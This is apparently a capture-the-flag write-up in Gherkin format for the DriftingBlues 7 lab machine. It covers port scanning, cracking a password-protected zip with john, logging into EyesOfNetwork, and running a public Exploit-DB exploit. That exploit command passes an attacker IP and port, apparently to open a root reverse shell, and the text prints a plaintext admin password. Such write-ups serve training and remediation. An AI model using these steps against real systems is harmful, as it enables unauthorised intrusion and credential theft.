## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub  DriftingBlues: 7
  Location:
    https://192.168.1.16
  CWE:
    CWE-094: https://cwe.mitre.org/data/definitions/094.html
    CWE-538: https://cwe.mitre.org/data/definitions/538.html
  Rule:
    REQ.004: https://docs.fluidattacks.com/criteria/vulnerabilities/004
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014
    REQ.020: https://docs.fluidattacks.com/criteria/vulnerabilities/020
    REQ.385: https://docs.fluidattacks.com/criteria/vulnerabilities/385
  Goal:
    Get root privileges and the root flag
  Recommendation:
    Upgrade tools such as EyesOfNetwork and don't save confidential information

  Background:

  Hacker's software:
    | <Software name> | <Version>    |
    | Kali linux      | 5.10.28      |
    | Virtualbox      | 6.1.34       |
    | Firefox         | 91.9.0       |
    | Nmap            | 7.92         |
    | arp-scan        | 1.9.7        |
    | DirBuster       | 1.0-RC1      |
    | searchsploit    | 3.8.8        |
  TOE information:
    Given a .ova file
    Then I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running SSH version OpenSSH 7.4
    And HTTP version SimpleHTTPServer
    And HTTP version Apache httpd 2.4.6
    And rpcbind version 2.4
    And SSL/HTTP version Apache httpd 2.4.6
    And taskmaster
    And mysql version MariaDB
    And HTTP version InfluxDB

  Scenario: Normal use case
    Given access to a virtual server
    And a mac address [evidence](02.png)
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24 | sudo arp-scan -l | grep 08
    """
    When looking at the result [evidence](03.png)
    Then I decided to visit the website:
    """
    http://192.168.1.16/
    """
    When looking in the browser
    Then I could see a web page and a login form [evidence](04.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.16
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.16
    """
    Then I could see services and which ports are open [evidence](05.png)
    And I decided to explore the different ports
    Then I noted that port 22 was used by SSH
    And its version OpenSSH 7.4
    Then I noted that port 66 was used by HTTP
    And its version SimpleHTTPServer
    Then I noted that port 80 was used by HTTP
    And its version Apache HTTPd 2.4.6
    Then I noted that port 111 was used by rpcbind
    And its version 2.4
    Then I noted that port 443 was used by SSL/HTTP
    And its version Apache HTTPd 2.4.6
    Then I noted that port 2403 was used by the taskmaster service
    Then I noted that port 3306 was used by mysql
    And its version MariaDB
    Then I noted that port 8086 was used by SSL/HTTP
    And its version InfluxDB
    When looking in the browser while visiting the next website:
    """
    http://192.168.1.16:66/
    """
    Then I could see a new web page [evidence](06.png)
    Then I decided to search possible hidden directories with DirBuster
    And I execute that GUI tool
    Then I got a directory called "eon" [evidence](07.png)
    When I checked, it has an encrypted file called "n467oDmM"
    Then I decided to download it [evidence](08.png)
    When I checked, it was a base64 encrypting file [evidence](09.png)
    Then I decoded the base64 code to a file [evidence](10.png)
    Then It was a zip file with an enabled security password [evidence](10.png)
    Then I execute the following command:
    """
    $ zip2john application.zip > /tmp/archivo.hash [evidence](11.png)
    """
    When I got the hash to obtain the password
    Then I execute the last command:
    """
    $ sudo john --wordlist=/user/share/wordlist/rockyou.txt
    /tmp/archivo.hash
    """
    And I got the password to the zip file [evidence](12.png)
    When looking at their contents
    Then it was a password and a user [evidence](13.png)
    Then I could conclude that I can use the credentials stored in plain text
    And exploit the confidential information vulnerability

  Scenario: Exploitation
    Given the website https://192.168.1.16
    And the confidential information vulnerability
    And the given credentials
    Then I log in using the web form from [evidence](14.png)
    """
    https://192.168.1.16
    """
    Then I got access to the EyesOfNetwork application
    When I was looking for the application info
    Then I got the EyesOfNetwork version [evidence](15.png)
    When looking for an EyesOfNetwork 5.3 vulnerability
    Then I found the following article [evidence](16.png)
    """
    https://www.exploit-db.com/exploits/48025
    """
    Then I execute the following commands: [evidence](17.png)
    """
    $ searchsploit EyesOfNetwork 5.3
    $ searchsploit -x php/webapps/48025.txt
    """
    Then I saw how to work with the python exploit
    And I execute the following commands: [evidence](18.png)
    """
    $ python3 remotePy_eyes_of_network.py https://192.168.1.16
    -ip 192.168.1.106 -port 9001
    -user admin -password isitreal31__
    """
    Then I become the root user [evidence](19.png)
    And I got the flag [evidence](20.png)

  Scenario: Remediation
    Given that the system has a vulnerability
    Then is necessary to upgrade the EyesOfNetwork tool
    And is necessary to avoid saving confidential info in files
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
  Temporal: Attributes that measure the exploit's popularity and fixability
    7.0/10 (High) - E:F/RL:O/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    7.0/10 (High) - CR:M/IR:M/AR:M

  Scenario: Correlations
    No correlations have been found to this date 2022-08-08
